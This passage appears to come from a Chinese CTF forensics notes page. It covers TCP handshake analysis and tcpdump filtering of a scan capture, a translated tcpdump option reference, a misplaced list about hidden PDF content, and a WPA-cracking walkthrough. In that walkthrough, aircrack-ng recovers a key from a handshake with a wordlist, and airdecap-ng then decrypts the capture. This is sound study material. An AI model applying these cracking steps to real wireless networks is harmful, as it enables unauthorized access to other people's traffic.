SYN+ACK"></a>第二次握手: SYN+ACK</h4><p><code>#2</code> 的 ack 是 <code>3310420140</code>，等于 <code>#1</code> 的 seq 加 1，这就说明，<code>#2</code> 是 <code>#1</code> 的应 答包。</p><p>这个应答包的特点：</p><ol><li>TCP flags 为 <code>S.</code>，即 SYN+ACK</li><li>length 也是 0，说明没有 payload</li><li>seq 为 <code>1353235534</code>，这是<strong>服务端的初始序列号</strong></li><li>到达 eth0 的时间为 <code>02:52:44.692890</code>，说明时间过了 <code>18ms</code></li></ol><h4 id="第三次握手-ACK"><a href="#第三次握手-ACK" class="headerlink" title="第三次握手: ACK"></a>第三次握手: ACK</h4><p>同理，<code>#3</code> 的 ack 等于 <code>#2</code> 的 seq 加 1，说明 <code>#3</code> 是 <code>#2</code> 的应答包。</p><p>这个包的特点：</p><ol><li>TCP flags 为 <code>.</code>，即 ACK</li><li>长度为 0，说明没有 TCP payload</li></ol><p>至此，三次握手完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line">localhost<span class="number">.801</span></span><br><span class="line">localhost.ftp</span><br><span class="line">localhost.ipp</span><br><span class="line">localhost.mysql</span><br><span class="line">localhost.ssh</span><br></pre></td></tr></table></figure><h3 id="输出分析"><a href="#输出分析" class="headerlink" title="输出分析"></a>输出分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpdump -r attachment.pcapng | head -n 10</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">29</span>:<span class="number">32.848771</span> IP <span class="number">192.168</span><span class="number">.10</span><span class="number">.212</span><span class="number">.43424</span> &gt; li370<span class="number">-223.</span>members.linode.com.https: Flags [S], seq <span class="number">3990734865</span>, win <span class="number">29200</span>, options [mss <span class="number">1460</span>,sackOK,TS val <span class="number">668024057</span> ecr <span class="number">0</span>,nop,wscale <span class="number">7</span>], length <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>packet <strong>时间戳</strong>，例如 <code>02:52:44.513700</code> 表示抓到这个包的时间是** 02 时 52 分 44 秒 513 毫秒**</li><li>packet <strong>类型</strong>，这里是 <code>IP</code> 包</li><li>源 (SRC) IP 和端口，目的 (DST) IP 和端口</li><li>packet TCP flags，其中<ul><li><code>S</code> 表示 <code>syn</code> 包</li><li><code>.</code> 表示 <code>ack</code> 包</li><li><code>F</code> 表示 <code>fin</code> 包</li><li><code>P</code> 表示 <code>push</code> 包（发送正常数据）</li></ul></li><li>序列号（seq）</li><li>应答号（ack）</li><li>包的 payload 长度</li><li>包的部分内容（ASCII）</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.默认情况下，tcpdump抓包结果中将进行域名解析，显示的是域名地址而非ip地址，使用-n选项，可指定显示ip地址</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 &#39;-&#39; 符号, 则tcpdump 会从标准输入中读取包数据.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含</span><br><span class="line">    网页数据的数据包时, 可方便查看数据(nt: 即Handy <span class="keyword">for</span> capturing web pages).</span><br><span class="line">-c  count</span><br><span class="line">    tcpdump将在接受到count个数据包后退出.</span><br><span class="line">-C  file-size</span><br><span class="line">    (nt: 此选项用于配合-w file 选项使用)</span><br><span class="line">    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,</span><br><span class="line">    另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.</span><br><span class="line">    该数字会从<span class="number">1</span>开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指<span class="number">1</span>,<span class="number">000</span>,<span class="number">000</span>个字节,</span><br><span class="line">    并非<span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>个字节, 后者是以<span class="number">1024</span>字节为<span class="number">1</span>k, <span class="number">1024</span>k字节为<span class="number">1</span>M计算所得, 即<span class="number">1</span>M=<span class="number">1024</span> ＊ <span class="number">1024</span> ＝ <span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>)</span><br><span class="line">-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,</span><br><span class="line">    通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)</span><br><span class="line">-dd 以C语言的形式打印出包匹配码.</span><br><span class="line">-ddd    以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的<span class="string">&#x27;count&#x27;</span>前缀).</span><br><span class="line">-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口</span><br><span class="line">    描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络</span><br><span class="line">    接口.</span><br><span class="line">    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字</span><br><span class="line">    编号在windows <span class="number">2000</span> 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.</span><br><span class="line">    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.</span><br><span class="line">-e  每行的打印输出中将包括数据包的数据链路层头部信息</span><br><span class="line">-E  spi@ipaddr algo:secret,...</span><br><span class="line">    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,</span><br><span class="line">    IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,</span><br><span class="line">    前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).</span><br><span class="line">    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.</span><br><span class="line">    可用于加密的算法包括des-cbc, <span class="number">3</span>des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).</span><br><span class="line">    默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).</span><br><span class="line">    secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 <span class="number">0</span>x 开头, 该密钥将以<span class="number">16</span>进制方式读入.</span><br><span class="line">    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来</span><br><span class="line">    使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.</span><br><span class="line">    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用</span><br><span class="line">    (nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此</span><br><span class="line">    文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,</span><br><span class="line">    不至于造成过大损害).</span><br><span class="line">-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.</span><br><span class="line">    (此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会</span><br><span class="line">    用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).</span><br><span class="line">    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)</span><br><span class="line">    及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络</span><br><span class="line">    掩码(nt: linux 下的 <span class="string">&#x27;any&#x27;</span> 网络接口就不需要设置地址和掩码, 不过此<span class="string">&#x27;any&#x27;</span>接口可以收到系统中所有接口的</span><br><span class="line">    数据包), 该选项不能正常工作.</span><br><span class="line">-F  file</span><br><span class="line">    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.</span><br><span class="line">-i  interface</span><br><span class="line">    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).</span><br><span class="line">    一但找到第一个符合条件的接口, 搜寻马上结束.</span><br><span class="line">    在采用<span class="number">2.2</span>版本或之后版本内核的Linux 操作系统上, <span class="string">&#x27;any&#x27;</span> 这个虚拟网络接口可被用来接收所有网络接口上的数据包</span><br><span class="line">    (nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在<span class="string">&#x27;混杂&#x27;</span>模式(promiscuous)下,</span><br><span class="line">    则无法在<span class="string">&#x27;any&#x27;</span>这个虚拟的网络接口上抓取其数据包.</span><br><span class="line">    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.</span><br><span class="line">-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).</span><br><span class="line">    在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:</span><br><span class="line">    ``tcpdump  -l  |  tee dat<span class="string">&#x27;&#x27;</span> 或者 ``tcpdump  -l   &gt; dat  &amp;  tail  -f  dat<span class="string">&#x27;&#x27;</span>.</span><br><span class="line">    (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作<span class="string">&#x27;&gt;&#x27;</span>, 把tcpdump的输出放到</span><br><span class="line">    dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)</span><br><span class="line">-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)</span><br><span class="line">-m  module</span><br><span class="line">    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构</span><br><span class="line">    MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)</span><br><span class="line">    协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).</span><br><span class="line">    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.</span><br><span class="line">-M  secret</span><br><span class="line">    如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC <span class="number">2385</span>有相关描述), 则为其摘要的验证指定一个公共的密钥secret.</span><br><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.</span><br><span class="line">-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印<span class="string">&#x27;nic&#x27;</span> 而不是 <span class="string">&#x27;nic.ddn.mil&#x27;</span>.</span><br><span class="line">-O  不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.</span><br><span class="line">-p  一般情况下, 把网络接口设置为非<span class="string">&#x27;混杂&#x27;</span>模式. 但必须注意 , 在特殊情况下此网络接口还是会以<span class="string">&#x27;混杂&#x27;</span>模式来工作； 从而, <span class="string">&#x27;-p&#x27;</span> 的设与不设,</span><br><span class="line">    不能当做以下选现的代名词:</span><br><span class="line">    <span class="string">&#x27;ether host &#123;local-hw-add&#125;&#x27;</span> 或  <span class="string">&#x27;ether broadcast&#x27;</span>(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).</span><br><span class="line">-q  快速(也许用&#x27;安静&#x27;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.</span><br><span class="line">-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装,</span><br><span class="line">    这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出<span class="string">&#x27;禁止中继&#x27;</span>域(nt: relay prevention field). 另外,</span><br><span class="line">     由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,</span><br><span class="line">    所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 <span class="string">&#x27;-&#x27;</span> 符号, 则tcpdump 会从标准输入中读取包数据.</span><br><span class="line">-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,</span><br><span class="line">    比如, 接受方收到第一个数据包的绝对顺序号为<span class="number">232323</span>, 对于后来接收到的第<span class="number">2</span>个,第<span class="number">3</span>个数据包, tcpdump会打印其序列号为<span class="number">1</span>, <span class="number">2</span>分别</span><br><span class="line">    表示与第一个数据包的差距为<span class="number">1</span> 和 <span class="number">2.</span> 而如果此时-S 选项被设置, 对于后来接收到的第<span class="number">2</span>个, 第<span class="number">3</span>个数据包会打印出其绝对顺序号:</span><br><span class="line">    <span class="number">232324</span>, <span class="number">232325</span>).</span><br><span class="line">-s  snaplen</span><br><span class="line">    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是<span class="number">68</span>字节(而支持网络接口分接头(nt: NIT, 上文已有描述,</span><br><span class="line">    可搜索<span class="string">&#x27;网络接口分接头&#x27;</span>关键字找到那里)的SunOS系列操作系统中默认的也是最小值是<span class="number">96</span>).</span><br><span class="line">    <span class="number">68</span>字节对于IP, ICMP(nt: Internet Control Message Protocol,</span><br><span class="line">    因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的</span><br><span class="line">    数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现<span class="string">&#x27;&#x27;</span>[|proto]<span class="string">&#x27;&#x27;</span>的标志（proto 实际会显示为</span><br><span class="line">    被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少</span><br><span class="line">    tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.</span><br><span class="line">    把snaplen 设置为<span class="number">0</span> 意味着让tcpdump自动选择合适的长度来抓取数据包.</span><br><span class="line">-T  type</span><br><span class="line">    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:</span><br><span class="line">    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),</span><br><span class="line">    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),</span><br><span class="line">    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),</span><br><span class="line">    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电</span><br><span class="line">    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).</span><br><span class="line">-t     在每行输出中不打印时间戳</span><br><span class="line">-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成<span class="number">1261798315</span>)</span><br><span class="line">-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)</span><br><span class="line">-tttt  在每行打印的时间戳之前添加日期的打印</span><br><span class="line">-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)</span><br><span class="line">-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,</span><br><span class="line">      而不是等文件的输出缓冲已满时才真正写入此文件)</span><br><span class="line">       -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.</span><br><span class="line">-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性</span><br><span class="line">      检测, 比如对IP或ICMP包头部的校验和.</span><br><span class="line">-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.</span><br><span class="line">-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,</span><br><span class="line">      其相应的图形选项将会以<span class="number">16</span>进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).</span><br><span class="line">-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.</span><br><span class="line">-W    filecount</span><br><span class="line">      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当</span><br><span class="line">      于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的<span class="number">0</span>, 这可以方便这些</span><br><span class="line">      文件被正确的排序.</span><br><span class="line">-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,</span><br><span class="line">      并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so <span class="keyword">for</span> link  layers  that</span><br><span class="line">      pad, 未能衔接理解和翻译, 需补充 )</span><br><span class="line">-xx   tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-y    datalinktype</span><br><span class="line">      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包</span><br><span class="line">-Z    user</span><br><span class="line">      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的</span><br><span class="line">      用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)</span><br><span class="line">      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)</span><br></pre></td></tr></table></figure><h2 id="Tcpdump常用命令实例"><a href="#Tcpdump常用命令实例" class="headerlink" title="Tcpdump常用命令实例"></a>Tcpdump常用命令实例</h2><ul><li>不可见的图层</li><li>Adobe的元数据格式‘XMP’</li><li>Adobe的XMP元数据</li><li>PDF的‘增量生成’功能允许保留用户不可见的前版本信息</li><li>白色的文字或背景图</li><li>图片背后的文字信息</li><li>图层后面被覆盖的另一个图层</li><li>不显示的注释层。</li></ul><h2 id="Wifi破解"><a href="#Wifi破解" class="headerlink" title="Wifi破解"></a>Wifi破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng ctf.pcap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">airdecap-ng ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng -w passwd.txt shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 1&#x2F;1 keys tested (37.17 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: --</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 88888888 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 </span><br><span class="line">                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F </span><br><span class="line"></span><br><span class="line">      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F </span><br><span class="line">                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C </span><br><span class="line">                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD </span><br><span class="line">                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">#注意ESSID</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure><p><code>-e</code>后面的为<code>ESSID</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ airdecap-ng -e <span class="number">0719</span> -p <span class="number">88888888</span> shipin.cap</span><br><span class="line">Total number of stations seen            <span class="number">6</span></span><br><span class="line">Total number of packets read         <span class="number">16664</span></span><br><span class="line">Total number of WEP data packets         <span class="number">0</span></span><br><span class="line">Total number of WPA data packets        <span class="number">27</span></span><br><span class="line">Number of plaintext data packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of corrupted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WPA  packets        <span class="number">16</span></span><br><span class="line">Number of bad TKIP (WPA) packets         <span class="number">0</span></span><br><span class="line">Number of bad CCMP (WPA) packets         <span class="number">0</span></span><br></pre></td></tr></table></figure><p>之后会解出来一个压缩包。</p>]]></content>
    
    
      
      
